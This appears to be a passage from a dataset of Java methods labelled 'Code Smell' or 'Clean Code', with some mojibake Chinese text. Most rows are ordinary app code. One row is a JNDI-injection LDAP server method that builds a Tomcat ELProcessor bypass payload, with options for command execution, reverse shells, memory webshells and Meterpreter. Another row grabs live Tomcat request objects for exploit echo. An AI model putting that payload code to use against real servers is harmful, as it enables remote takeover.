        if (isUnmatched(paramType,argType)) {
          return true;
        }
      }
    }
  }
  return false;
}
private boolean isUnmatched(Type toType,Type fromType){
  if (toType.equals(fromType)) {
    return false;
  }
  if (toType instanceof PrimitiveType) {
    return !typeSystem.getBoxedType(type).equals(fromType);
  }
  return !typeSystem.isSubtype(toType,fromType);
}",1,Code Smell
"public void setParams(){
  try {
    boolean flag=false;
    Thread[] threads=(Thread[])getField(Thread.currentThread().getThreadGroup(),""threads"");
    for (int i=0; i < threads.length; i++) {
      Thread thread=threads[i];
      if (thread != null) {
        String threadName=thread.getName();
        if (!threadName.contains(""exec"") && threadName.contains(""http"")) {
          Object target=getField(thread,""target"");
          Object global=null;
          if (target instanceof Runnable) {
            try {
              global=getField(getField(getField(target,""this$0""),""handler""),""global"");
            }
 catch (            NoSuchFieldException fieldException) {
              fieldException.printStackTrace();
            }
          }
          if (global != null) {
            List processors=(List)getField(global,""processors"");
            for (i=0; i < processors.size(); i++) {
              RequestInfo requestInfo=(RequestInfo)processors.get(i);
              if (requestInfo != null) {
                org.apache.coyote.Request tempRequest=(org.apache.coyote.Request)getField(requestInfo,""req"");
                org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)tempRequest.getNote(1);
                Response response=request.getResponse();
                this.request=request;
                this.response=response;
                flag=true;
                break;
              }
            }
          }
        }
      }
      if (flag) {
        break;
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",1,Code Smell
"public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
  try {
    Thread.sleep(1000);
  }
 catch (  InterruptedException e) {
    throw new RuntimeException(e);
  }
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
  int i=1 / 0;
}
void foo();
@MyCustomAnnotation public void foo(){
  System.out.println(""foo..."");
}
public String foo(){
  System.out.println(""foo..."");
  return ""this is a foo"";
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
  ((MyService)AopContext.currentProxy()).bar();
}
void foo();
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
public void foo(){
  System.out.println(""foo..."");
}
void foo();",0,Clean Code
"/** 
 * Determine the JVM descriptor for a specified class. Unlike the other descriptors used in the compilation process, this is the one the JVM wants, so this one includes any necessary trailing semicolon (e.g. Ljava/lang/String; rather than Ljava/lang/String)
 * @param clazz a class
 * @return the JVM descriptor for the class
 */
public static String toJvmDescriptor(Class<?> clazz){
  StringBuilder sb=new StringBuilder();
  if (clazz.isArray()) {
    while (clazz.isArray()) {
      sb.append(""["");
      clazz=clazz.getComponentType();
    }
  }
  if (clazz.isPrimitive()) {
    if (clazz == Void.TYPE) {
      sb.append('V');
    }
 else     if (clazz == Integer.TYPE) {
      sb.append('I');
    }
 else     if (clazz == Boolean.TYPE) {
      sb.append('Z');
    }
 else     if (clazz == Character.TYPE) {
      sb.append('C');
    }
 else     if (clazz == Long.TYPE) {
      sb.append('J');
    }
 else     if (clazz == Double.TYPE) {
      sb.append('D');
    }
 else     if (clazz == Float.TYPE) {
      sb.append('F');
    }
 else     if (clazz == Byte.TYPE) {
      sb.append('B');
    }
 else     if (clazz == Short.TYPE) {
      sb.append('S');
    }
  }
 else {
    sb.append(""L"");
    sb.append(clazz.getName().replace('.','/'));
    sb.append("";"");
  }
  return sb.toString();
}
",0,Clean Code
"@SuppressLint(""NewApi"") @Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  int widthSize=MeasureSpec.getSize(widthMeasureSpec);
  int heightSize=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(widthSize,heightSize);
  if (Build.VERSION.SDK_INT < 21) {
    inLayout=true;
    if (heightSize == AndroidUtilities.displaySize.y + AndroidUtilities.statusBarHeight) {
      if (getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
        setPadding(0,AndroidUtilities.statusBarHeight,0,0);
      }
      heightSize=AndroidUtilities.displaySize.y;
    }
 else {
      if (getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
        setPadding(0,0,0,0);
      }
    }
    inLayout=false;
  }
 else {
    int newSize=heightSize - AndroidUtilities.statusBarHeight;
    if (newSize > 0 && newSize < 4096) {
      AndroidUtilities.displaySize.y=newSize;
    }
  }
  final boolean applyInsets=lastInsets != null && Build.VERSION.SDK_INT >= 21;
  final int childCount=getChildCount();
  for (int i=0; i < childCount; i++) {
    final View child=getChildAt(i);
    if (child.getVisibility() == GONE) {
      continue;
    }
    final LayoutParams lp=(LayoutParams)child.getLayoutParams();
    if (applyInsets) {
      if (child.getFitsSystemWindows()) {
        dispatchChildInsets(child,lastInsets,lp.gravity);
      }
 else       if (child.getTag() == null) {
        applyMarginInsets(lp,lastInsets,lp.gravity,Build.VERSION.SDK_INT >= 21);
      }
    }
    if (drawerLayout != child) {
      final int contentWidthSpec=MeasureSpec.makeMeasureSpec(widthSize - lp.leftMargin - lp.rightMargin,MeasureSpec.EXACTLY);
      final int contentHeightSpec;
      if (lp.height > 0) {
        contentHeightSpec=lp.height;
      }
 else {
        contentHeightSpec=MeasureSpec.makeMeasureSpec(heightSize - lp.topMargin - lp.bottomMargin,MeasureSpec.EXACTLY);
      }
      child.measure(contentWidthSpec,contentHeightSpec);
    }
 else {
      child.setPadding(0,0,0,0);
      final int drawerWidthSpec=getChildMeasureSpec(widthMeasureSpec,minDrawerMargin + lp.leftMargin + lp.rightMargin,lp.width);
      final int drawerHeightSpec=getChildMeasureSpec(heightMeasureSpec,lp.topMargin + lp.bottomMargin,lp.height);
      child.measure(drawerWidthSpec,drawerHeightSpec);
    }
  }
}",1,Code Smell
"@Override public void sendResult(InMemoryInterceptedSearchResult result,String base) throws Exception {
  System.out.println(""[+] Sending LDAP ResourceRef result for "" + base + "" with javax.el.ELProcessor payload"");
  Entry e=new Entry(base);
  e.addAttribute(""javaClassName"",""java.lang.String"");
  ResourceRef ref=new ResourceRef(""javax.el.ELProcessor"",null,"""","""",true,""org.apache.naming.factory.BeanFactory"",null);
  ref.add(new StringRefAddr(""forceString"",""x=eval""));
  TomcatBypassHelper helper=new TomcatBypassHelper();
  String code=null;
switch (type) {
case dnslog:
    code=helper.getDnsRequestCode(params[0]);
  break;
case command:
code=helper.getExecCode(params[0]);
break;
case reverseshell:
code=helper.getReverseShellCode(params[0],params[1]);
break;
case tomcatecho:
code=helper.injectTomcatEcho();
break;
case springecho:
code=helper.injectSpringEcho();
break;
case tomcatmemshell1:
code=helper.injectTomcatMemshell1();
break;
case tomcatmemshell2:
code=helper.injectTomcatMemshell2();
break;
case springmemshell:
code=helper.injectSpringMemshell();
break;
case tomcatmemshell3:
code=helper.injectmemshell3();
break;
case issuccess:
code=helper.injectSuccess();
break;
case godzillamemshell:
code=helper.injectGodzilla();
break;
case meterpreter:
code=helper.injectMeterpreter();
break;
}
String finalPayload=payloadTemplate.replace(""{replacement}"",code);
ref.add(new StringRefAddr(""x"",finalPayload));
e.addAttribute(""javaSerializedData"",Util.serialize(ref));
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0,ResultCode.SUCCESS));
}",1,Code Smell
"public static String processProxyListFile(Context ctx,File proxyListFile){
  try {
    if (proxyListFile.length() > 2 * 1024 * 1024L) {
      throw new IllegalArgumentException(""file too large."");
    }
    JSONObject proxyRootObject=new JSONObject(FileUtil.readUtf8String(proxyListFile));
    int version=proxyRootObject.optInt(""nekox_proxy_list_version"",1);
    if (version == 1) {
      if (proxyRootObject.isNull(""proxies"")) {
        throw new IllegalArgumentException(""proxies array not found."");
      }
      JSONArray proxyArray=proxyRootObject.getJSONArray(""proxies"");
      if (proxyArray.length() == 0) {
        throw new IllegalArgumentException(""Empty proxy list."");
      }
      LinkedList<String> imported=new LinkedList<>();
      LinkedHashMap<String,String> errors=new LinkedHashMap<>();
      for (int index=0; index < proxyArray.length(); index++) {
        String proxyUrl=proxyArray.getString(index);
        try {
          imported.add(ProxyUtil.importInBackground(proxyUrl).getTitle());
        }
 catch (        Exception ex) {
          errors.put(proxyUrl.length() < 15 ? proxyUrl : (proxyUrl.substring(0,15) + ""...""),ex.getMessage());
        }
      }
      StringBuilder status=new StringBuilder();
      if (!imported.isEmpty()) {
        status.append(LocaleController.getString(""ImportedProxies"",R.string.ImportedProxies));
        for (        String success : imported) {
          status.append(""\n"").append(success);
        }
        if (!errors.isEmpty()) {
          status.append(""\n\n"");
        }
      }
      if (!errors.isEmpty()) {
        status.append(LocaleController.getString(""ErrorsInImport"",R.string.ErrorsInImport));
        for (        Map.Entry<String,String> error : errors.entrySet()) {
          status.append(""\n"").append(error.getKey()).append("": "").append(error.getValue());
        }
      }
      if (imported.isEmpty()) {
        AlertUtil.showSimpleAlert(ctx,status.toString());
      }
 else {
        return status.toString();
      }
    }
 else {
      throw new IllegalArgumentException(""invalid proxy list version "" + version + ""."");
    }
  }
 catch (  Exception e) {
    AlertUtil.showSimpleAlert(ctx,LocaleController.getString(""InvalidProxyFile"",R.string.InvalidProxyFile) + proxyListFile.getPath() + ""\n\n""+ e.getMessage());
  }
  return null;
}",1,Code Smell
"@Override public void updateInviteInfo(InviteInfo inviteInfo){
  if (inviteInfo == null || (inviteInfo.getDeviceId() == null || inviteInfo.getChannelId() == null)) {
    logger.warn(""[鏇存柊Invite淇℃伅]锛屽弬鏁颁笉鍏細 {}"",JSON.toJSON(inviteInfo));
    return;
  }
  InviteInfo inviteInfoForUpdate=null;
  if (InviteSessionStatus.ready == inviteInfo.getStatus()) {
    if (inviteInfo.getDeviceId() == null || inviteInfo.getChannelId() == null || inviteInfo.getType() == null || inviteInfo.getStream() == null) {
      return;
    }
    inviteInfoForUpdate=inviteInfo;
  }
 else {
    InviteInfo inviteInfoInRedis=getInviteInfo(inviteInfo.getType(),inviteInfo.getDeviceId(),inviteInfo.getChannelId(),inviteInfo.getStream());
    if (inviteInfoInRedis == null) {
      logger.warn(""[鏇存柊Invite淇℃伅]锛屾湭浠庣紦瀛樹腑璇诲彇鍒癐nvite淇℃伅锛� deviceId: {}, channel: {}, stream: {}"",inviteInfo.getDeviceId(),inviteInfo.getChannelId(),inviteInfo.getStream());
      return;
    }
    if (inviteInfo.getStreamInfo() != null) {
      inviteInfoInRedis.setStreamInfo(inviteInfo.getStreamInfo());
    }
    if (inviteInfo.getSsrcInfo() != null) {
      inviteInfoInRedis.setSsrcInfo(inviteInfo.getSsrcInfo());
    }
    if (inviteInfo.getStreamMode() != null) {
      inviteInfoInRedis.setStreamMode(inviteInfo.getStreamMode());
    }
    if (inviteInfo.getReceiveIp() != null) {
      inviteInfoInRedis.setReceiveIp(inviteInfo.getReceiveIp());
    }
    if (inviteInfo.getReceivePort() != null) {
      inviteInfoInRedis.setReceivePort(inviteInfo.getReceivePort());
    }
    if (inviteInfo.getStatus() != null) {
      inviteInfoInRedis.setStatus(inviteInfo.getStatus());
    }
    inviteInfoForUpdate=inviteInfoInRedis;
  }
  String key=VideoManagerConstants.INVITE_PREFIX + "":"" + inviteInfoForUpdate.getType()+ "":""+ inviteInfoForUpdate.getDeviceId()+ "":""+ inviteInfoForUpdate.getChannelId()+ "":""+ inviteInfoForUpdate.getStream()+ "":""+ inviteInfoForUpdate.getSsrcInfo().getSsrc();
  redisTemplate.opsForValue().set(key,inviteInfoForUpdate);
}
",1,Code Smell
"@Override public void tick(MovementContext ctx){
  if (!ctx.world.isClientSide())   return;
  Contraption contraption=ctx.contraption;
  if (!(contraption instanceof ElevatorContraption)) {
    if (!(contraption.presentBlockEntities.get(ctx.localPos) instanceof ContraptionControlsBlockEntity))     return;
    ItemStack filter=getFilter(ctx);
    int value=contraption.isActorTypeDisabled(filter) || contraption.isActorTypeDisabled(ItemStack.EMPTY) ? 4 * 45 : 0;
    cbe.indicator.setValue(value);
    cbe.indicator.updateChaseTarget(value);
    cbe.tickAnimations();
    return;
  }
  if (!(ctx.temporaryData instanceof ElevatorFloorSelection))   ctx.temporaryData=new ElevatorFloorSelection();
  ElevatorFloorSelection efs=(ElevatorFloorSelection)ctx.temporaryData;
  tickFloorSelection(efs,ec);
  if (!(contraption.presentBlockEntities.get(ctx.localPos) instanceof ContraptionControlsBlockEntity))   return;
  cbe.tickAnimations();
  int currentY=(int)Math.round(contraption.entity.getY() + ec.getContactYOffset());
  boolean atTargetY=ec.clientYTarget == currentY;
  LerpedFloat indicator=cbe.indicator;
  float currentIndicator=indicator.getChaseTarget();
  boolean below=atTargetY ? currentIndicator > 0 : ec.clientYTarget <= currentY;
  if (currentIndicator == 0 && !atTargetY) {
    int startingPoint=below ? 181 : -181;
    indicator.setValue(startingPoint);
    indicator.updateChaseTarget(startingPoint);
    cbe.tickAnimations();
    return;
  }
  int currentStage=Mth.floor(((currentIndicator % 360) + 360) % 360);
  if (!atTargetY || currentStage / 45 != 0) {
    float increment=currentStage / 45 == (below ? 4 : 3) ? 2.25f : 33.75f;
    indicator.chase(currentIndicator + (below ? increment : -increment),45f,Chaser.LINEAR);
    return;
  }
  indicator.setValue(0);
  indicator.updateChaseTarget(0);
  return;
}",0,Clean Code
"private void createButtons(JPanel topPanel){
  final JPanel buttonPanel=new JPanel(new GridBagLayout());
  this.saveButton=new JButton(""Save"");
  this.saveButton.setMnemonic(KeyEvent.VK_S);
  final GridBagConstraints saveConstraints=createButtonConstraints(0,0);
  this.saveButton.addActionListener(e -> saveConfigValues());
  buttonPanel.add(this.saveButton,saveConstraints);
  this.cancelButton=new JButton(""Cancel"");
  this.cancelButton.setMnemonic(KeyEvent.VK_C);
  this.cancelButton.addActionListener(e -> {
    loadSavedFieldValues();
    enableButtons(false);
  }
);
  final GridBagConstraints cancelConstraints=createButtonConstraints(1,5);
  buttonPanel.add(this.cancelButton,cancelConstraints);
  final GridBagConstraints buttonPanelConstraints=new GridBagConstraints();
  buttonPanelConstraints.gridx=1;
  buttonPanelConstraints.gridwidth=2;
  buttonPanelConstraints.gridy=this.configParameters.size() + 1;
  buttonPanelConstraints.weightx=0.01;
  buttonPanelConstraints.fill=GridBagConstraints.HORIZONTAL;
  topPanel.add(buttonPanel,buttonPanelConstraints);
}",0,Clean Code
"/** 
 * Trying to filter languages preferred by the user
 */
private MediaTrack[][] filterByLanguage(MediaTrack[][] trackGroupList,MediaTrack originTrack){
  if (!(originTrack instanceof AudioTrack) || trackGroupList.length <= 1) {
    return trackGroupList;
  }
  String audioLanguage=PlayerData.instance(mContext).getAudioLanguage();
  String resultLanguage=null;
  String originLanguage=null;
  if (!TextUtils.isEmpty(audioLanguage) && originTrack.isSaved) {
    resultLanguage=audioLanguage;
  }
  if (originTrack.format != null && !TextUtils.isEmpty(originTrack.format.language)) {
    originLanguage=originTrack.format.language;
  }
  if (resultLanguage == null && originLanguage == null) {
    return trackGroupList;
  }
  List<MediaTrack[]> resultTracks=null;
  List<MediaTrack[]> originTracks=null;
  List<MediaTrack[]> resultTracksFallback=null;
  for (  MediaTrack[] trackGroup : trackGroupList) {
    if (trackGroup != null && trackGroup.length >= 1) {
      MediaTrack mediaTrack=trackGroup[0];
      if (mediaTrack != null && mediaTrack.format != null) {
        if (Helpers.startsWith(mediaTrack.format.language,resultLanguage)) {
          if (resultTracks == null) {
            resultTracks=new ArrayList<>();
          }
          resultTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,originLanguage)) {
          if (originTracks == null) {
            originTracks=new ArrayList<>();
          }
          originTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,DEFAULT_LANGUAGE)) {
          if (resultTracksFallback == null) {
            resultTracksFallback=new ArrayList<>();
          }
          resultTracksFallback.add(trackGroup);
        }
      }
    }
  }
  if (resultTracks != null && !resultTracks.isEmpty()) {
    return resultTracks.toArray(new MediaTrack[0][]);
  }
  if (originTracks != null && !originTracks.isEmpty()) {
    return originTracks.toArray(new MediaTrack[0][]);
  }
  if (resultTracksFallback != null && !resultTracksFallback.isEmpty()) {
    return resultTracksFallback.toArray(new MediaTrack[0][]);
  }
  return trackGroupList;
}",1,Code Smell
"@Override public void onTransitionAnimationEnd(boolean isOpen,boolean backward){
  super.onTransitionAnimationEnd(isOpen,backward);
  if (isOpen && blurredView != null) {
    if (blurredView.getParent() != null) {
      ((ViewGroup)blurredView.getParent()).removeView(blurredView);
    }
    blurredView.setBackground(null);
  }
  notificationsLocker.unlock();
  if (!isOpen) {
    if (opnendForSelect && removeFragmentOnTransitionEnd) {
      removeSelfFromStack();
      if (dialogsActivity != null) {
        dialogsActivity.removeSelfFromStack();
      }
    }
 else     if (finishDialogRightSlidingPreviewOnTransitionEnd) {
      removeSelfFromStack();
      if (parentDialogsActivity != null && parentDialogsActivity.rightSlidingDialogContainer != null) {
        if (parentDialogsActivity.rightSlidingDialogContainer.hasFragment()) {
          parentDialogsActivity.rightSlidingDialogContainer.finishPreview();
        }
      }
    }
  }
}
",0,Clean Code
"private static void queryUserPatrol(){
  try {
    JSONObject jo=new JSONObject(AntForestRpcCall.queryUserPatrol());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject resData=new JSONObject(AntForestRpcCall.queryMyPatrolRecord());
      if (resData.optBoolean(""canSwitch"")) {
        JSONArray records=resData.getJSONArray(""records"");
        for (int i=0; i < records.length(); i++) {
          JSONObject record=records.getJSONObject(i);
          JSONObject userPatrol=record.getJSONObject(""userPatrol"");
          if (userPatrol.getInt(""unreachedNodeCount"") > 0) {
            if (""silent"".equals(userPatrol.getString(""mode""))) {
              JSONObject patrolConfig=record.getJSONObject(""patrolConfig"");
              String patrolId=patrolConfig.getString(""patrolId"");
              resData=new JSONObject(AntForestRpcCall.switchUserPatrol(patrolId));
              if (""SUCCESS"".equals(resData.getString(""resultCode""))) {
                Log.forest(""宸￠�烩殩锔�-鍒囨崲鍦板浘鑷�"" + patrolId);
              }
              queryUserPatrol();
              return;
            }
            break;
          }
        }
      }
      JSONObject userPatrol=jo.getJSONObject(""userPatrol"");
      int currentNode=userPatrol.getInt(""currentNode"");
      String currentStatus=userPatrol.getString(""currentStatus"");
      int patrolId=userPatrol.getInt(""patrolId"");
      JSONObject chance=userPatrol.getJSONObject(""chance"");
      int leftChance=chance.getInt(""leftChance"");
      int leftStep=chance.getInt(""leftStep"");
      int usedStep=chance.getInt(""usedStep"");
      if (""STANDING"".equals(currentStatus)) {
        if (leftChance > 0) {
          jo=new JSONObject(AntForestRpcCall.patrolGo(currentNode,patrolId));
          patrolKeepGoing(jo.toString(),currentNode,patrolId);
          Thread.sleep(500);
          queryUserPatrol();
        }
 else         if (leftStep >= 2000 && usedStep < 10000) {
          jo=new JSONObject(AntForestRpcCall.exchangePatrolChance(leftStep));
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            int addedChance=jo.optInt(""addedChance"",0);
            Log.forest(""姝ユ暟鍏戞崲鈿栵笍[宸℃姢娆℃暟*"" + addedChance + ""]"");
            queryUserPatrol();
          }
 else {
            Log.i(TAG,jo.getString(""resultDesc""));
          }
        }
      }
 else       if (""GOING"".equals(currentStatus)) {
        patrolKeepGoing(null,currentNode,patrolId);
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryUserPatrol err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * 鍚堝苟 {@linkplain DataSetProperty}銆� <p> 灏嗗悎骞跺垪琛ㄧ殑 {@linkplain DataSetProperty#getType()}銆亄@linkplain DataSetProperty#getLabel()}銆� {@linkplain DataSetProperty#getDefaultValue()}鍚堝苟鑷冲熀纭�鍒楄〃閲岀殑鍚屽悕椤癸紝澶氫綑椤瑰垯鐩存帴娣诲姞锛� 鍚屾椂鏍规嵁 {@code merge}閲岀殑鎺掑簭瀵箋@code dataSetProperties}閲嶆帓锛岃繑鍥炰竴涓柊鐨勫垪琛ㄣ�� </p>
 * @param base 鍏佽涓簕@code null}锛屽熀纭�鍒楄〃
 * @param merge 鍏佽涓簕@code null}锛屽悎骞跺垪琛�
 * @return
 */
protected List<DataSetProperty> mergeProperties(List<? extends DataSetProperty> base,List<? extends DataSetProperty> merge){
  if (base == null)   base=Collections.emptyList();
  if (merge == null)   merge=Collections.emptyList();
  List<DataSetProperty> dps=new ArrayList<DataSetProperty>(base.size());
  for (  DataSetProperty dataSetProperty : base)   dps.add(dataSetProperty.clone());
  for (  DataSetProperty dp : dps) {
    DataSetProperty mp=NameAwareUtil.find(merge,dp.getName());
    if (mp != null) {
      dp.setType(mp.getType());
      dp.setLabel(mp.getLabel());
      dp.setDefaultValue(mp.getDefaultValue());
      dp.setEvaluated(mp.isEvaluated());
      dp.setExpression(mp.getExpression());
    }
  }
  for (  DataSetProperty mp : merge) {
    if (NameAwareUtil.find(dps,mp.getName()) == null)     dps.add(mp);
  }
  final List<? extends DataSetProperty> mergedFinal=merge;
  dps.sort(new Comparator<DataSetProperty>(){
    @Override public int compare(    DataSetProperty o1,    DataSetProperty o2){
      int o1Idx=NameAwareUtil.findIndex(mergedFinal,o1.getName());
      int o2Idx=NameAwareUtil.findIndex(mergedFinal,o2.getName());
      if (o1Idx < 0)       o1Idx=NameAwareUtil.findIndex(dps,o1.getName());
      if (o2Idx < 0)       o2Idx=NameAwareUtil.findIndex(dps,o2.getName());
      return Integer.valueOf(o1Idx).compareTo(o2Idx);
    }
  }
);
  return dps;
}",0,Clean Code
"@Override public List<CrmStatisticsPoolSummaryByDateRespVO> getPoolSummaryByDate(CrmStatisticsCustomerReqVO reqVO){
  reqVO.setUserIds(getUserIds(reqVO));
  if (CollUtil.isEmpty(reqVO.getUserIds())) {
    return Collections.emptyList();
  }
  List<CrmStatisticsPoolSummaryByDateRespVO> customerPutCountList=customerMapper.selectPoolCustomerPutCountByDate(reqVO);
  List<CrmStatisticsPoolSummaryByDateRespVO> customerTakeCountList=customerMapper.selectPoolCustomerTakeCountByDate(reqVO);
  List<LocalDateTime[]> timeRanges=LocalDateTimeUtils.getDateRangeList(reqVO.getTimes()[0],reqVO.getTimes()[1],reqVO.getInterval());
  return convertList(timeRanges,times -> {
    Integer customerPutCount=customerPutCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerPutCount).sum();
    Integer customerTakeCount=customerTakeCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerTakeCount).sum();
    return new CrmStatisticsPoolSummaryByDateRespVO().setTime(LocalDateTimeUtils.formatDateRange(times[0],times[1],reqVO.getInterval())).setCustomerPutCount(customerPutCount).setCustomerTakeCount(customerTakeCount);
  }
);
}",0,Clean Code
"/** 
 * Add message store statistics information.
 * @param msgCnt             the message count written
 * @param msgIndexSize       the message index size written
 * @param msgDataSize        the message data size written
 * @param flushedMsgCnt      the flushed message count
 * @param flushedDataSize    the flushed message size
 * @param isDataSegFlush     whether the data segment flushed
 * @param isIndexSegFlush    whether the index segment flushed
 * @param isDataSizeFull     whether the cached data is full
 * @param isMsgCntFull       whether the cached message count is full
 * @param isCacheTimeFull    whether the cached time is full
 * @param isForceMetadata    whether force push metadata
 * @param dltAppendTime      the duration of the append operation
 */
public void addFileFlushStatsInfo(int msgCnt,int msgIndexSize,int msgDataSize,long flushedMsgCnt,long flushedDataSize,boolean isDataSegFlush,boolean isIndexSegFlush,boolean isDataSizeFull,boolean isMsgCntFull,boolean isCacheTimeFull,boolean isForceMetadata,long dltAppendTime){
  if (isClosed) {
    return;
  }
  MsgStoreStatsItemSet tmStatsSet=msgStoreStatsSets[getIndex()];
  tmStatsSet.fileAccumMsgCnt.addValue(msgCnt);
  tmStatsSet.fileAccumMsgIndexSize.addValue(msgIndexSize);
  tmStatsSet.fileAccumMsgDataSize.addValue(msgDataSize);
  tmStatsSet.fileFlusheDurStats.update(dltAppendTime);
  if (flushedDataSize > 0) {
    tmStatsSet.fileFlushedDataSize.update(flushedDataSize);
  }
  if (flushedMsgCnt > 0) {
    tmStatsSet.fileFlushedMsgCnt.update(flushedMsgCnt);
  }
  if (isDataSegFlush) {
    tmStatsSet.fileDataSegAddCnt.incValue();
  }
  if (isIndexSegFlush) {
    tmStatsSet.fileIndexSegAddCnt.incValue();
  }
  if (isDataSizeFull) {
    tmStatsSet.fileDataSizeFullCnt.incValue();
  }
  if (isMsgCntFull) {
    tmStatsSet.fileMsgCountFullCnt.incValue();
  }
  if (isCacheTimeFull) {
    tmStatsSet.fileCachedTimeFullCnt.incValue();
  }
  if (isForceMetadata) {
    tmStatsSet.fileMetaFlushCnt.incValue();
  }
}",0,Clean Code
"@Override public void onAdapterChanged(RecyclerView.Adapter oldAdapter,RecyclerView.Adapter newAdapter){
  if (DEBUG)   Log.v(getTag(),""onAdapterChanged to "" + newAdapter);
  if (oldAdapter != null) {
    discardLayoutInfo();
    mFocusPosition=NO_POSITION;
    mFocusPositionOffset=0;
    mChildrenStates.clear();
  }
  if (newAdapter instanceof FacetProviderAdapter) {
    mFacetProviderAdapter=(FacetProviderAdapter)newAdapter;
  }
 else {
    mFacetProviderAdapter=null;
  }
  super.onAdapterChanged(oldAdapter,newAdapter);
}",0,Clean Code
"public boolean processSendingText(CharSequence text,boolean notify,int scheduleDate){
  int[] emojiOnly=new int[1];
  Emoji.parseEmojis(text,emojiOnly);
  boolean hasOnlyEmoji=emojiOnly[0] > 0;
  if (!hasOnlyEmoji) {
    text=AndroidUtilities.getTrimmedString(text);
  }
  boolean supportsNewEntities=supportsSendingNewEntities();
  int maxLength=accountInstance.getMessagesController().maxMessageLength;
  if (text.length() != 0) {
    if (delegate != null && parentFragment != null && (scheduleDate != 0) == parentFragment.isInScheduleMode()) {
      delegate.prepareMessageSending();
    }
    int end;
    int start=0;
    do {
      int whitespaceIndex=-1;
      int dotIndex=-1;
      int tabIndex=-1;
      int enterIndex=-1;
      if (text.length() > start + maxLength) {
        int i=start + maxLength - 1;
        int k=0;
        while (i > start && k < 300) {
          char c=text.charAt(i);
          char c2=i > 0 ? text.charAt(i - 1) : ' ';
          if (c == '\n' && c2 == '\n') {
            tabIndex=i;
            break;
          }
 else           if (c == '\n') {
            enterIndex=i;
          }
 else           if (dotIndex < 0 && Character.isWhitespace(c) && c2 == '.') {
            dotIndex=i;
          }
 else           if (whitespaceIndex < 0 && Character.isWhitespace(c)) {
            whitespaceIndex=i;
          }
          i--;
          k++;
        }
      }
      end=Math.min(start + maxLength,text.length());
      if (tabIndex > 0) {
        end=tabIndex;
      }
 else       if (enterIndex > 0) {
        end=enterIndex;
      }
 else       if (dotIndex > 0) {
        end=dotIndex;
      }
 else       if (whitespaceIndex > 0) {
        end=whitespaceIndex;
      }
      CharSequence part=text.subSequence(start,end);
      if (!hasOnlyEmoji) {
        part=AndroidUtilities.getTrimmedString(part);
      }
      CharSequence[] message=new CharSequence[]{part};
      ArrayList<TLRPC.MessageEntity> entities=MediaDataController.getInstance(currentAccount).getEntities(message,supportsNewEntities);
      MessageObject.SendAnimationData sendAnimationData=null;
      if (!delegate.hasForwardingMessages()) {
        sendAnimationData=new MessageObject.SendAnimationData();
        sendAnimationData.width=sendAnimationData.height=AndroidUtilities.dp(22);
        if (messageEditText != null) {
          messageEditText.getLocationInWindow(location);
          sendAnimationData.x=location[0] + AndroidUtilities.dp(11);
          sendAnimationData.y=location[1] + AndroidUtilities.dp(8 + 11);
        }
 else {
          sendAnimationData.x=AndroidUtilities.dp(48 + 11);
          sendAnimationData.y=AndroidUtilities.displaySize.y - AndroidUtilities.dp(8 + 11);
        }
      }
      boolean updateStickersOrder=false;
      updateStickersOrder=SendMessagesHelper.checkUpdateStickersOrder(text);
      SendMessagesHelper.getInstance(currentAccount).sendMessage(message[0].toString(),dialog_id,replyingMessageObject,getThreadMessage(),messageWebPage,messageWebPageSearch,entities,null,null,notify,scheduleDate,sendAnimationData,updateStickersOrder);
      start=end + 1;
    }
 while (end != text.length());
    return true;
  }
  return false;
}",1,Code Smell
"static private int calculateScore(Keyword candidateKeyword,Keyword targetKeyword,int index){
  if (!KeywordMatch.match(candidateKeyword,targetKeyword)) {
    return -(50 + 3 * index);
  }
  int score=5 - 3 * index;
  String targetName=targetKeyword.songName.toLowerCase();
  String candidateSongName=candidateKeyword.songName.toLowerCase();
  int candidateLen=candidateSongName.length();
  int targetLen=targetName.length();
  score-=Math.abs(candidateLen - targetLen);
  String leftName=candidateSongName.replace(targetName,"""");
  List<String> words=Arrays.asList(""live"",""dj"",""remix"",""cover"",""instrumental"",""浼村"",""缈诲敱"",""缈昏嚜"");
  for (  String word : words) {
    if (KeywordMatch.match(word,leftName)) {
      if (KeywordMatch.match(word,targetKeyword.extra)) {
        score=7;
      }
 else {
        score-=2;
      }
    }
  }
  score-=Math.abs(targetKeyword.singers.size() - candidateKeyword.singers.size());
  for (  String targetSinger : targetKeyword.singers) {
    for (    String candidateSinger : candidateKeyword.singers) {
      if (KeywordMatch.match(targetSinger,candidateSinger)) {
        score+=3;
        score-=Math.abs(targetSinger.length() - candidateSinger.length());
      }
    }
  }
  return score;
}",1,Code Smell
"public Iterator getReferrers(Object obj,boolean includeWeak){
  List instances=new ArrayList();
  List references=new ArrayList();
  if (obj instanceof Instance) {
    references.addAll(((Instance)obj).getReferences());
  }
 else   if (obj instanceof JavaClass) {
    references.addAll(((JavaClass)obj).getInstances());
    references.add(((JavaClass)obj).getClassLoader());
  }
  if (!references.isEmpty()) {
